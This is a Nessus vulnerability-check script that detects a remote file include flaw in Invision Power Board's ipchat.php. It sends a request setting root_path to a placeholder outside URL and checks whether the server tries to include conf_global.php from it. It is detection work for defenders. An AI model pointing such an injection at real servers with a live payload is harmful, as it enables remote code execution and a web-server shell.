#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11273);
 script_bugtraq_id(6976, 7204);
 script_version ("$Revision: 1.9 $");
 
 name["english"] = "Invision PowerBoard code injection";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to a remote
file include attack. 

Description :

It is possible to make the remote host include PHP files hosted on a
third-party server using Invision Power Board. 

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server. 

Solution : 

Unknown at this time.

See also : 

http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0099.html

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for root_path include flaw in ipchat.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003-2006 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003-2006 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("invision_power_board_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/invision_power_board"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];

    req = http_get(item:string(dir, "/ipchat.php?root_path=http://xxxxxxxx/"),
	port:port);
    r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if( r == NULL )exit(0);
    if(egrep(pattern:".*http://xxxxxxxx/conf_global.php.*", string:r))
    {
      security_hole(port);
      exit(0);
    }
  }
}
